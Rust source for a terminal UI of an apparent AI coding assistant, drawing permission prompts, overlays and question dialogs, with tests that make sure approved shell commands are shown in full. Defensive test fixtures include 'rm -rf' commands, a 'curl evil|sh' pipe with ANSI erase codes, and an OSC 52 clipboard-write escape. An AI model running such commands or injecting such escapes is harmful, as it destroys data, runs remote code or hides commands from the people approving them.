fn draw_permission(f: &mut Frame, area: Rect, app: &mut App, tc: ThemeColors) {
    let Some(perm) = &mut app.pending_permission else {
        return;
    };

    let mut lines = vec![Line::raw("")];
    for dl in perm.description.lines() {
        lines.push(Line::from(Span::styled(
            format!("  {dl}"),
            Style::default().fg(Color::White),
        )));
    }
    // trim: false keeps the command's own indentation when it wraps.
    let para = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: false });

    let popup_w = (area.width * 7 / 10).max(50).min(area.width);
    // Measure with the same Paragraph that is drawn: a character-count
    // estimate ignores word wrapping, which pushes long path tokens down a
    // row and silently cut off the tail of commands like `cp … && rm -rf …`.
    let text_w = popup_w.saturating_sub(2).max(1);
    let body_rows = u16::try_from(para.line_count(text_w)).unwrap_or(u16::MAX);
    // 2 borders + spacer + legend.
    let popup_h = body_rows.saturating_add(4).max(8).min(area.height);
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup = Rect {
        x,
        y,
        width: popup_w,
        height: popup_h,
    };

    f.render_widget(Clear, popup);

    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(tc.tool))
        .title(Span::styled(
            " Permission required ",
            Style::default().fg(tc.tool).add_modifier(Modifier::BOLD),
        ));
    let inner = block.inner(popup);
    f.render_widget(block, popup);

    // The legend is drawn pinned to the bottom row, so it stays visible even
    // when the command is taller than the screen.
    let legend = Line::from(vec![
        Span::styled("  [", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "y",
            Style::default()
                .fg(tc.assistant)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled("] allow   [", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "a",
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled("] always   [", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "n",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        ),
        Span::styled("] deny", Style::default().fg(Color::DarkGray)),
    ]);

    let legend_h = 1.min(inner.height);
    let body = Rect {
        height: inner.height.saturating_sub(legend_h + 1),
        ..inner
    };
    let legend_area = Rect {
        y: inner.y + inner.height.saturating_sub(legend_h),
        height: legend_h,
        ..inner
    };

    if body_rows <= body.height {
        perm.fully_shown = true;
        f.render_widget(para, body);
    } else {
        // Taller than the screen: scroll instead of clipping, and keep the
        // last body row for a marker so the cut is never silent.
        let view_h = body.height.saturating_sub(1);
        let max_scroll = body_rows - view_h;
        perm.scroll = perm.scroll.min(max_scroll);
        let below = max_scroll - perm.scroll;
        if below == 0 && view_h > 0 {
            perm.fully_shown = true;
        }
        f.render_widget(
            para.scroll((perm.scroll, 0)),
            Rect {
                height: view_h,
                ..body
            },
        );
        let marker = if below > 0 {
            Span::styled(
                format!("  ↓ {below} more rows (↓/PgDn): read to allow"),
                Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
            )
        } else {
            Span::styled(
                "  ── end of command (↑/PgUp scrolls back) ──",
                Style::default().fg(Color::DarkGray),
            )
        };
        f.render_widget(
            Paragraph::new(Line::from(marker)),
            Rect {
                y: body.y + view_h,
                height: body.height - view_h,
                ..body
            },
        );
    }
    f.render_widget(Paragraph::new(legend), legend_area);
}

// ── Overlay panel ─────────────────────────────────────────────────────────────

fn draw_overlay(f: &mut Frame, area: Rect, app: &mut App, tc: ThemeColors) {
    let Some(overlay) = &mut app.overlay else {
        return;
    };

    let popup_w = area.width.saturating_sub(8).max(40).min(area.width);
    let popup_h = (area.height * 4 / 5).max(10).min(area.height);
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup = Rect {
        x,
        y,
        width: popup_w,
        height: popup_h,
    };

    f.render_widget(Clear, popup);

    let title = format!(" {} ", overlay.title);
    let hint = if overlay.is_interactive() {
        " ↑↓ select · Enter resume · d delete · 1-9 quick · Esc close "
    } else {
        " Esc / Enter / q to close  ↑↓ to scroll "
    };
    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(tc.accent))
        .title(Span::styled(
            title,
            Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
        ))
        .title_bottom(Span::styled(hint, Style::default().fg(Color::DarkGray)))
        .style(Style::default().bg(Color::Rgb(16, 16, 24)));
    let inner = block.inner(popup);
    f.render_widget(block, popup);

    // For interactive overlays, highlight the selected item line.
    // Session list lines start with "  N. [" — the Nth item maps to selectable_ids[N-1].
    // "N. " with the space, so item 1 does not also match "10." to "19.".
    let selected_prefix = overlay
        .is_interactive()
        .then(|| format!("{}. ", overlay.selected + 1));
    let is_selected = |line: &Line| {
        selected_prefix.as_ref().is_some_and(|prefix| {
            let raw: String = line.spans.iter().map(|s| s.content.as_ref()).collect();
            raw.trim_start().starts_with(prefix.as_str())
        })
    };

    // Scroll is counted in wrapped rows, not lines: a session row wider than
    // the popup takes two rows, and a line-based offset let the selection
    // drift below the bottom edge (where `d` would delete an unseen session)
    // and stopped short of the last rows of a long non-interactive overlay.
    // Lines are pre-rendered markdown, computed once in Overlay::new(); their
    // wrapped row counts are cached per width, so a frame only clones and
    // wraps the lines in view (a /diff overlay can be tens of thousands of
    // lines and is redrawn on every 50 ms heartbeat).
    let width = inner.width.max(1);
    if overlay.row_cache.as_ref().is_none_or(|(w, _)| *w != width) {
        let rows = overlay
            .rendered
            .iter()
            .map(|l| {
                Paragraph::new(l.clone())
                    .wrap(Wrap { trim: false })
                    .line_count(width)
                    .max(1)
            })
            .collect();
        overlay.row_cache = Some((width, rows));
    }
    let Some((_, rows)) = &overlay.row_cache else {
        return;
    };
    // starts[i] = first wrapped row of line i; starts[n] = total rows.
    let mut starts = Vec::with_capacity(rows.len() + 1);
    let mut acc = 0usize;
    starts.push(0);
    for r in rows {
        acc += r;
        starts.push(acc);
    }
    let total = acc;
    let visible = inner.height as usize;

    // Auto-scroll to keep the selected item visible
    if let Some(line_idx) = overlay.rendered.iter().position(is_selected) {
        let top = starts[line_idx];
        let bottom = starts[line_idx + 1];
        if top < overlay.scroll {
            overlay.scroll = top;
        } else if bottom > overlay.scroll + visible {
            overlay.scroll = bottom.saturating_sub(visible);
        }
    }

    overlay.scroll = overlay.scroll.min(total.saturating_sub(visible));
    if overlay.rendered.is_empty() {
        return;
    }

    // The line holding the first visible row, and the offset into it.
    let first = starts.partition_point(|&s| s <= overlay.scroll) - 1;
    let end_row = overlay.scroll + visible;
    let display: Vec<Line> = (first..overlay.rendered.len())
        .take_while(|&j| starts[j] < end_row)
        .map(|j| {
            let mut line = overlay.rendered[j].clone();
            if is_selected(&line) {
                // Highlight the entire line
                for span in &mut line.spans {
                    span.style = span
                        .style
                        .bg(Color::Rgb(50, 50, 80))
                        .fg(Color::White)
                        .add_modifier(Modifier::BOLD);
                }
            }
            line
        })
        .collect();

    // Smaller than one line's row count, so it always fits in u16.
    let offset = u16::try_from(overlay.scroll - starts[first]).unwrap_or(u16::MAX);
    f.render_widget(
        Paragraph::new(Text::from(display))
            .wrap(Wrap { trim: false })
            .scroll((offset, 0)),
        inner,
    );
}

// ── AskUser dialog ────────────────────────────────────────────────────────────

fn draw_ask_user(f: &mut Frame, area: Rect, app: &App) {
    let Some(q) = &app.pending_user_question else {
        return;
    };

    let mut lines = vec![Line::raw("")];
    for ql in q.question.lines() {
        lines.push(Line::from(Span::styled(
            format!("  {ql}"),
            Style::default().fg(Color::White),
        )));
    }
    lines.push(Line::raw(""));
    let question = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: true });

    // Render the text input row with cursor
    let before: String = q.input[..q.cursor].iter().collect();
    let rest = &q.input[q.cursor..];
    // A space cursor cell is whitespace to the word wrapper, which drops it
    // where a row breaks; NBSP draws the same but wraps as text.
    let cur_ch = match rest.first() {
        Some(' ') | None => "\u{a0}".to_string(),
        Some(c) => c.to_string(),
    };
    let after_str: String = rest.iter().skip(1).collect();
    let footer = Paragraph::new(Text::from(vec![
        Line::from(vec![
            Span::styled(
                "  > ",
                Style::default()
                    .fg(Color::Cyan)
                    .add_modifier(Modifier::BOLD),
            ),
            Span::styled(before, Style::default().fg(Color::White)),
            Span::styled(cur_ch, Style::default().bg(Color::White).fg(Color::Black)),
            Span::styled(after_str, Style::default().fg(Color::White)),
        ]),
        Line::raw(""),
        Line::from(Span::styled(
            "  Enter to send  ·  Esc to cancel",
            Style::default().fg(Color::DarkGray),
        )),
    ]))
    .wrap(Wrap { trim: true });

    // Sized by wrapped rows, not question lines: a long one-line question
    // wrapped past the popup's height and pushed the answer field and hint
    // out of it.
    let popup_w = (area.width * 7 / 10).max(50).min(area.width);
    let inner_w = popup_w.saturating_sub(2).max(1);
    let rows = |p: &Paragraph| u16::try_from(p.line_count(inner_w)).unwrap_or(u16::MAX);
    let (question_h, footer_h) = (rows(&question), rows(&footer));
    let popup_h = question_h
        .saturating_add(footer_h)
        .saturating_add(2)
        .max(8)
        .min(area.height);
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup = Rect {
        x,
        y,
        width: popup_w,
        height: popup_h,
    };

    f.render_widget(Clear, popup);

    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Cyan))
        .title(Span::styled(
            " Claude is asking ",
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ));
    let inner = block.inner(popup);
    f.render_widget(block, popup);

    // The answer field and hint are pinned to the bottom, so on a short
    // terminal the question is clipped rather than the place to type.
    let footer_h = footer_h.min(inner.height);
    let question_area = Rect {
        height: inner.height - footer_h,
        ..inner
    };
    let footer_area = Rect {
        y: inner.y + question_area.height,
        height: footer_h,
        ..inner
    };
    f.render_widget(question, question_area);
    f.render_widget(footer, footer_area);
}

#[cfg(test)]
mod permission_popup_tests {
    use super::*;
    use ratatui::{Terminal, backend::TestBackend};

    fn render_permission(app: &mut crate::tui::app::App, w: u16, h: u16) -> (String, String) {
        let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
        term.draw(|f| {
            let area = f.area();
            draw_permission(f, area, app, theme_colors("dark"));
        })
        .unwrap();
        let buf = term.backend().buffer();
        let screen: String = (0..buf.area.height)
            .map(|y| {
                (0..buf.area.width)
                    .map(|x| buf[(x, y)].symbol().to_string())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n");
        let flat: String = screen
            .chars()
            .filter(|c| !c.is_whitespace() && *c != '│')
            .collect();
        (screen, flat)
    }

    fn app_with_command(cmd: &str) -> crate::tui::app::App {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        let (reply, _rx) = tokio::sync::oneshot::channel();
        app.pending_permission = Some(crate::tui::app::PendingPermission {
            tool_name: "Bash".into(),
            description: format!("Run shell command:\n  {cmd}"),
            reply,
            scroll: 0,
            fully_shown: false,
        });
        app
    }

    /// The user must see the whole command they approve, and the legend.
    #[test]
    fn long_command_and_legend_are_fully_visible() {
        let cmd = format!("echo {} && rm -rf ./build-artifacts-TAIL", "x".repeat(300));
        let mut app = app_with_command(&cmd);
        let (screen, flat) = render_permission(&mut app, 100, 40);
        assert!(flat.contains("build-artifacts-TAIL"), "{screen}");
        assert!(screen.contains("] deny"), "{screen}");
        assert!(app.pending_permission.unwrap().fully_shown);
    }

    /// Word wrapping moves whole path tokens down a row, so a char-count
    /// estimate under-sized the popup and hid the `rm -rf` tail.
    #[test]
    fn word_wrapped_command_tail_is_visible() {
        let p = "/home/user/projects/acme-platform/services/billing";
        let cmd = format!(
            "cp {p}/config/production.yaml {p}/backups/staging-backup.yaml && rm -rf {p}/data/ledger-archive-TAIL"
        );
        for w in [80, 100] {
            let mut app = app_with_command(&cmd);
            let (screen, flat) = render_permission(&mut app, w, 40);
            assert!(flat.contains("ledger-archive-TAIL"), "w={w}\n{screen}");
            assert!(screen.contains("] deny"), "w={w}\n{screen}");
            assert!(app.pending_permission.unwrap().fully_shown, "w={w}");
        }
    }

    /// A command taller than the terminal is never cut silently: a marker
    /// says rows are hidden, y/a stay disabled until they were scrolled into
    /// view, and the tail is reachable by scrolling.
    #[test]
    fn command_taller_than_screen_scrolls_and_gates_approval() {
        let body: String = (0..30).map(|i| format!("line-{i}\n")).collect();
        let cmd = format!("cat <<'EOF' > f\n{body}EOF\nrm -rf ./TAIL-DIR");
        let mut app = app_with_command(&cmd);
        let (screen, flat) = render_permission(&mut app, 100, 16);
        assert!(screen.contains("more rows"), "{screen}");
        assert!(!flat.contains("TAIL-DIR"), "{screen}");
        assert!(screen.contains("] deny"), "{screen}");
        assert!(!app.pending_permission.as_ref().unwrap().fully_shown);

        app.pending_permission.as_mut().unwrap().scroll = u16::MAX;
        let (screen, flat) = render_permission(&mut app, 100, 16);
        assert!(flat.contains("TAIL-DIR"), "{screen}");
        assert!(screen.contains("end of command"), "{screen}");
        assert!(app.pending_permission.unwrap().fully_shown);
    }

    /// A model id wider than the terminal used to index outside the status
    /// bar buffer and abort the whole process.
    #[test]
    fn narrow_terminal_with_long_model_id_does_not_panic() {
        let mut app = crate::tui::app::App::new(
            "openrouter:meta-llama/llama-3.1-405b-instruct",
            std::path::Path::new("/tmp"),
        );
        app.show_welcome = false;
        for w in [1, 2, 10, 40, 47, 48, 80] {
            let mut term = Terminal::new(TestBackend::new(w, 10)).unwrap();
            term.draw(|f| draw(f, &mut app)).unwrap();
        }
    }

    /// With a browse step and a tool permission both waiting, keys answer the
    /// permission prompt first, so that is the one that must be on screen.
    #[test]
    fn permission_prompt_is_drawn_over_a_pending_browse_approval() {
        let mut app = app_with_command("echo PERMISSION-CMD");
        app.show_welcome = false;
        let (reply, _rx) = tokio::sync::oneshot::channel();
        app.browse_approval = Some(crate::browser::approval_gate::ApprovalPrompt {
            id: 1,
            step: 3,
            tool_name: "browser_click".into(),
            target_text: "BROWSE-TARGET".into(),
            url: "https://example.com".into(),
            reason: "submit".into(),
            reply,
        });
        let mut term = Terminal::new(TestBackend::new(100, 40)).unwrap();
        term.draw(|f| draw(f, &mut app)).unwrap();
        let screen: String = term
            .backend()
            .buffer()
            .content
            .iter()
            .map(|c| c.symbol())
            .collect();
        assert!(screen.contains("PERMISSION-CMD"), "{screen}");
        assert!(!screen.contains("BROWSE-TARGET"), "{screen}");
    }

    /// A failed tool's output was one run-on red paragraph: newlines
    /// dropped, never collapsed, the whole thing re-wrapped every frame.
    #[test]
    fn tool_error_keeps_line_breaks_and_collapses() {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        app.show_welcome = false;
        let body: String = (0..500).map(|i| format!("err-line-{i}\n")).collect();
        app.entries.push(crate::tui::app::ChatEntry::tool_error(body));
        let mut term = Terminal::new(TestBackend::new(80, 40)).unwrap();
        term.draw(|f| draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let rows: Vec<String> = (0..buf.area.height)
            .map(|y| {
                (0..buf.area.width)
                    .map(|x| buf[(x, y)].symbol().to_string())
                    .collect::<String>()
            })
            .collect();
        let screen = rows.join("\n");
        assert!(
            rows.iter().any(|r| r.starts_with("✖ err-line-0 ")),
            "{screen}"
        );
        assert!(
            rows.iter().any(|r| r.starts_with("  err-line-1 ")),
            "{screen}"
        );
        assert!(screen.contains("err-line-5"), "{screen}");
        assert!(!screen.contains("err-line-6"), "{screen}");
        assert!(screen.contains("[▸ 494 more lines]"), "{screen}");
    }

    /// Only tool failures collapse: a non-tool error such as a model switch
    /// with no credential put "Model unchanged: X" behind "[▸ N more lines]"
    /// with no key to expand it.
    #[test]
    fn non_tool_error_is_shown_whole() {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        app.show_welcome = false;
        let body = format!(
            "Backend error: no credential\n{}\nModel unchanged: claude-x",
            (1..=8)
                .map(|i| format!("{i}. option {i}"))
                .collect::<Vec<_>>()
                .join("\n")
        );
        assert!(body.lines().count() >= 10);
        app.entries.push(crate::tui::app::ChatEntry::error(body));
        let mut term = Terminal::new(TestBackend::new(80, 40)).unwrap();
        term.draw(|f| draw(f, &mut app)).unwrap();
        let screen = screen_rows(&term).join("\n");
        assert!(screen.contains("Model unchanged: claude-x"), "{screen}");
        assert!(!screen.contains("more lines"), "{screen}");
    }

    /// The input box was sized by char count, so wide CJK text, a line
    /// that exactly filled the row (pushing the cursor cell down) and word
    /// wrap all got too few rows and the cursor's row was clipped.
    #[test]
    fn input_box_fits_its_wrapped_rows_and_shows_the_cursor() {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        app.show_welcome = false;
        let cursor_drawn = |app: &mut crate::tui::app::App, w: u16| {
            let mut term = Terminal::new(TestBackend::new(w, 20)).unwrap();
            term.draw(|f| draw(f, app)).unwrap();
            let buf = term.backend().buffer();
            buf.content.iter().any(|c| c.bg == Color::White)
        };
        let words = "abcdefghijklmn ".repeat(26);
        // The old char-count estimate gave 1, 1 and 5 rows.
        let cases = [
            ("中".repeat(40), 3),         // one 80-col word, then the cursor
            ("x".repeat(78), 2),          // 2 + 78 + cursor = 81 cols
            (words.trim_end().into(), 6), // 389 chars, 5 words a row
        ];
        for (text, want) in cases {
            app.input = text.chars().collect();
            app.cursor = app.input.len();
            assert_eq!(input_height(&app, 80), want, "{text}");
            assert!(cursor_drawn(&mut app, 80), "{text}");
        }

        // Taller than the 8-row cap: the box scrolls to the cursor.
        app.input = "line\n".repeat(20).chars().collect();
        app.cursor = app.input.len();
        assert_eq!(input_height(&app, 80), 8);
        assert!(cursor_drawn(&mut app, 80));
        // Cursor after CJK text sits on the next char, not at the line end.
        app.input = "中文字".chars().collect();
        app.cursor = 1;
        let mut term = Terminal::new(TestBackend::new(40, 10)).unwrap();
        term.draw(|f| draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let cur = buf.content.iter().find(|c| c.bg == Color::White).unwrap();
        assert_eq!(cur.symbol(), "文");
    }

    /// Raw ESC/BEL in the dialog or in chat must never reach the terminal:
    /// `\x1b[2K` would erase the shown command, OSC 52 writes the clipboard.
    #[test]
    fn control_chars_never_reach_the_terminal() {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        app.show_welcome = false;
        app.entries.push(crate::tui::app::ChatEntry::tool_result(
            "1\t\x1b]52;c;ZWNobyBwd25lZA==\x07",
        ));
        let (reply, _rx) = tokio::sync::oneshot::channel();
        app.pending_permission = Some(crate::tui::app::PendingPermission {
            tool_name: "Bash".into(),
            description: "Run shell command:\n  curl evil|sh\x1b[2K\x1b[Gls\r".into(),
            reply,
            scroll: 0,
            fully_shown: false,
        });
        let mut term = Terminal::new(TestBackend::new(80, 30)).unwrap();
        term.draw(|f| draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let bad: Vec<String> = buf
            .content
            .iter()
            .map(|c| c.symbol().to_string())
            .filter(|s| s.chars().any(char::is_control))
            .collect();
        assert!(bad.is_empty(), "control chars rendered: {bad:?}");
        let screen: String = buf.content.iter().map(|c| c.symbol()).collect();
        assert!(screen.contains("\u{241b}[2K"), "{screen}");
    }

    fn screen_rows(term: &Terminal<TestBackend>) -> Vec<String> {
        let buf = term.backend().buffer();
        (0..buf.area.height)
            .map(|y| {
                (0..buf.area.width)
                    .map(|x| buf[(x, y)].symbol().to_string())
                    .collect()
            })
            .collect()
    }

    /// The dialog was sized by the question's '\n' count, so a long
    /// one-line question wrapped over the answer field and the hint.
    #[test]
    fn ask_user_keeps_the_answer_field_under_a_long_question() {
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        let (reply, _rx) = tokio::sync::oneshot::channel();
        app.pending_user_question = Some(crate::tui::app::PendingUserQuestion {
            question: format!(
                "{} which one?",
                "should the migration keep the old column ".repeat(7)
            ),
            reply,
            input: "yes".chars().collect(),
            cursor: 3,
        });
        for (w, h) in [(100, 30), (80, 30), (80, 9)] {
            let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
            term.draw(|f| {
                let area = f.area();
                draw_ask_user(f, area, &app);
            })
            .unwrap();
            let screen = screen_rows(&term).join("\n");
            assert!(screen.contains("> yes"), "{w}x{h}\n{screen}");
            assert!(screen.contains("Enter to send"), "{w}x{h}\n{screen}");
            if h == 30 {
                assert!(screen.contains("which one?"), "{w}x{h}\n{screen}");
            }
        }
    }

    /// Overlay scroll was counted in lines while session rows wrap to two
    /// screen rows, so from about the 7th session on the highlighted row was
    /// below the popup's bottom edge, and `d` deleted a session out of view.
    #[test]
    fn overlay_selection_stays_visible_when_rows_wrap() {
        let preview = "refactor the auth middleware so tokens refresh ".repeat(2);
        let text: String = (1..=20)
            .map(|n| {
                format!(
                    "  {n}. [abcd{n:04}] Tue Oct 6, 2:32 PM — {}\n",
                    &preview[..60]
                )
            })
            .collect();
        let ids: Vec<String> = (1..=20).map(|n| n.to_string()).collect();
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        app.overlay = Some(crate::tui::app::Overlay::with_items("sessions", text, ids));
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        let order: Vec<usize> = (0..20).chain((0..20).rev()).collect();
        for sel in order {
            app.overlay.as_mut().unwrap().selected = sel;
            term.draw(|f| {
                let area = f.area();
                draw_overlay(f, area, &mut app, theme_colors("dark"));
            })
            .unwrap();
            let rows = screen_rows(&term);
            let buf = term.backend().buffer();
            let lit: Vec<String> = (0..buf.area.height)
                .filter(|&y| (0..buf.area.width).any(|x| buf[(x, y)].bg == Color::Rgb(50, 50, 80)))
                .map(|y| rows[y as usize].clone())
                .collect();
            let want = format!("{}. [abcd", sel + 1);
            assert!(
                lit.first().is_some_and(|row| row.contains(&want)),
                "selection {} not on screen: {lit:?}",
                sel + 1
            );
            // "1." used to light up 10.-19. as well.
            assert!(lit.len() <= 2, "{lit:?}");
        }

        // A non-interactive overlay scrolls all the way to its last row.
        let long: String = (0..40)
            .map(|i| format!("line {i} {}\n\n", "word ".repeat(30)))
            .collect::<String>()
            + "END-OF-OVERLAY";
        app.overlay = Some(crate::tui::app::Overlay::new("notes", long));
        app.overlay.as_mut().unwrap().scroll = usize::MAX;
        term.draw(|f| {
            let area = f.area();
            draw_overlay(f, area, &mut app, theme_colors("dark"));
        })
        .unwrap();
        let screen = screen_rows(&term).join("\n");
        assert!(screen.contains("END-OF-OVERLAY"), "{screen}");
    }

    /// Rows past 65535 were unreachable (absolute u16 scroll), and a partly
    /// scrolled wrapped line must start mid-line, not at its first row.
    #[test]
    fn overlay_scrolls_past_u16_rows_and_into_wrapped_lines() {
        let draw_it = |app: &mut crate::tui::app::App, term: &mut Terminal<TestBackend>| {
            term.draw(|f| {
                let area = f.area();
                draw_overlay(f, area, app, theme_colors("dark"));
            })
            .unwrap();
            screen_rows(term).join("\n")
        };
        let mut app = crate::tui::app::App::new("claude-sonnet-5", std::path::Path::new("/tmp"));
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        let big: String = (0..70_000).map(|i| format!("row-{i}\n\n")).collect();
        app.overlay = Some(crate::tui::app::Overlay::new("diff", big));
        app.overlay.as_mut().unwrap().scroll = usize::MAX;
        let screen = draw_it(&mut app, &mut term);
        assert!(screen.contains("row-69999"), "{screen}");
        let o = app.overlay.as_ref().unwrap();
        assert!(o.scroll > u16::MAX as usize);
        assert!(o.row_cache.is_some());

        // One line that wraps to many rows: scroll into its middle.
        let words: String = (0..400).map(|i| format!("w{i:03} ")).collect();
        app.overlay = Some(crate::tui::app::Overlay::new("notes", words));
        app.overlay.as_mut().unwrap().scroll = 5;
        let screen = draw_it(&mut app, &mut term);
        // 14 words a row: row 5 starts at w070.
        assert!(!screen.contains("w069 "), "{screen}");
        assert!(screen.contains("│w070 "), "{screen}");
    }
}
